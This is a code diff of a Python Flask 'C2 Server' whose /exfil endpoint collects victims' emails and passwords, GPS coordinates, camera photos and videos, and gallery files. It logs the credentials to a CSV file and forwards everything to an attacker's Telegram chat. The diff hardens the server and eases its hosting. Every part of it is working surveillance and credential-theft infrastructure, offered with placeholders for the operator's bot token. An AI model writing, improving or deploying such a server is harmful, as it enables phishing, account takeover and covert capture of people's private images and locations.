@@ -1,65 +1,89 @@
-from flask import Flask, request, jsonify, Response
-import requests
+import os
+import sys
 import json
 import base64
-import os
 import csv
 import re
 from datetime import datetime
+from flask import Flask, request, jsonify
+import requests
 
-app = Flask(__name__)
-
-# ===== YOUR CONFIG =====
+# ============================================================
+# CONFIG — CHANGE THESE
+# ============================================================
 TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE"
 TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
-# =======================
+# ============================================================
+
+app = Flask(__name__)
+app.secret_key = os.urandom(24)  # Fixes 400 error on Render
 
 # Create folders
-os.makedirs("photos", exist_ok=True)
-os.makedirs("videos", exist_ok=True)
-os.makedirs("audio", exist_ok=True)
-os.makedirs("gallery", exist_ok=True)
+for folder in ["photos", "videos", "audio", "gallery", "logs"]:
+    os.makedirs(folder, exist_ok=True)
 
-# Logs
-os.makedirs("logs", exist_ok=True)
+# Credentials log
 CREDENTIAL_CSV = os.path.join("logs", "credentials.csv")
 if not os.path.exists(CREDENTIAL_CSV):
     with open(CREDENTIAL_CSV, 'w', newline='', encoding='utf-8') as f:
         writer = csv.writer(f)
         writer.writerow(['timestamp', 'email', 'password', 'ip'])
 
+# ============================================================
+# TELEGRAM HELPER
+# ============================================================
 def send_telegram(message):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
         if len(message) > 4000:
             for i in range(0, len(message), 4000):
-                requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message[i:i+4000]}, timeout=5)
+                chunk = message[i:i+4000]
+                requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": chunk}, timeout=5)
         else:
             requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=5)
         print("[✓] Forwarded to Telegram")
+        return True
     except Exception as e:
         print(f"[!] Telegram error: {e}")
+        return False
 
+# ============================================================
+# CORS MIDDLEWARE
+# ============================================================
 @app.after_request
 def add_cors(response):
     response.headers['Access-Control-Allow-Origin'] = '*'
     response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
-    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Accept'
+    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Accept, X-Requested-With'
+    response.headers['Access-Control-Allow-Credentials'] = 'true'
     return response
 
+# ============================================================
+# ROUTES
+# ============================================================
 @app.route('/exfil', methods=['GET', 'POST', 'OPTIONS'])
 def exfil():
+    # Handle preflight
     if request.method == 'OPTIONS':
         return '', 200
     
     try:
+        # Parse data — with safe fallback
+        data = {}
         if request.method == 'GET':
             data = request.args.to_dict()
         elif request.is_json:
-            data = request.get_json() or {}
+            try:
+                data = request.get_json(force=True, silent=True) or {}
+            except:
+                data = {}
         else:
-            data = request.form.to_dict() or {'raw': request.data.decode('utf-8', errors='ignore')}
+            try:
+                data = request.form.to_dict()
+            except:
+                data = {'raw': request.data.decode('utf-8', errors='ignore')}
         
+        # Get IP
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         if ip and ',' in ip:
             ip = ip.split(',')[0].strip()
@@ -67,9 +91,9 @@ def exfil():
         data['timestamp'] = datetime.now().isoformat()
         
         data_type = data.get('type', 'unknown')
-        print(f"[+] Data received: {data_type} from {ip}")
+        print(f"[+] Data: {data_type} from {ip}")
         
-        # --- Credentials ---
+        # === CREDENTIALS ===
         if data_type == 'credentials':
             email = data.get('email', '')
             password = data.get('pass', '')
@@ -79,7 +103,7 @@ def exfil():
             send_telegram(f"🔐 <b>Credentials</b>\n📧 {email}\n🔑 {password}\n🌐 IP: {ip}")
             return jsonify({"status": "OK"}), 200
         
-        # --- Location ---
+        # === LOCATION ===
         if data_type == 'location':
             lat = data.get('lat')
             lon = data.get('lon')
@@ -87,7 +111,7 @@ def exfil():
             send_telegram(msg)
             return jsonify({"status": "OK"}), 200
         
-        # --- Photo ---
+        # === PHOTO ===
         if data_type == 'photo':
             raw = data.get('data', '')
             camera = data.get('camera', 'unknown')
@@ -98,7 +122,7 @@ def exfil():
                 send_telegram(f"📸 Photo ({camera} camera)\nSaved: {filename}")
             return jsonify({"status": "OK"}), 200
         
-        # --- Video ---
+        # === VIDEO ===
         if data_type == 'video':
             raw = data.get('data', '')
             camera = data.get('camera', 'front')
@@ -109,7 +133,7 @@ def exfil():
                 send_telegram(f"🎥 Video ({camera} camera)\nSaved: {filename}")
             return jsonify({"status": "OK"}), 200
         
-        # --- Gallery File ---
+        # === GALLERY FILE ===
         if data_type == 'media_file':
             filename = data.get('filename', 'unknown')
             filepath = data.get('path', '')
@@ -124,28 +148,42 @@ def exfil():
                 send_telegram(f"📁 Gallery file\n📄 {filename}\n📂 {filepath}")
             return jsonify({"status": "OK"}), 200
         
-        # --- Media Complete ---
+        # === MEDIA COMPLETE ===
         if data_type == 'media_extraction_complete':
             count = data.get('count', 0)
             send_telegram(f"✅ Gallery extraction complete: {count} files")
             return jsonify({"status": "OK"}), 200
         
-        # --- Default ---
+        # === TEST ===
+        if data_type == 'test':
+            msg = data.get('message', 'No message')
+            send_telegram(f"🧪 Test message: {msg}")
+            return jsonify({"status": "OK", "message": "Test received"}), 200
+        
+        # === DEFAULT ===
         send_telegram(f"📨 Data\n{json.dumps(data, indent=2)[:2000]}")
         return jsonify({"status": "OK"}), 200
         
     except Exception as e:
-        print(f"[!] Error: {e}")
-        return jsonify({"status": "ERROR"}), 500
+        error_msg = str(e)
+        print(f"[!] Error: {error_msg}")
+        send_telegram(f"[!] Server error: {error_msg}")
+        return jsonify({"status": "ERROR", "message": error_msg}), 500
 
-@app.route('/ping', methods=['GET'])
+@app.route('/ping', methods=['GET', 'OPTIONS'])
 def ping():
+    if request.method == 'OPTIONS':
+        return '', 200
     return jsonify({"status": "PONG"}), 200
 
 @app.route('/', methods=['GET'])
 def home():
-    return jsonify({"status": "C2 Server Running"}), 200
+    return jsonify({"status": "C2 Server Running", "endpoints": ["/ping", "/exfil"]}), 200
 
+# ============================================================
+# MAIN
+# ============================================================
 if __name__ == "__main__":
-    print("🚀 C2 Server Running")
-    app.run(host="0.0.0.0", port=8080, debug=False)
+    port = int(os.environ.get("PORT", 8080))
+    print(f"🚀 C2 Server Running on port {port}")
+    app.run(host="0.0.0.0", port=port, debug=False)
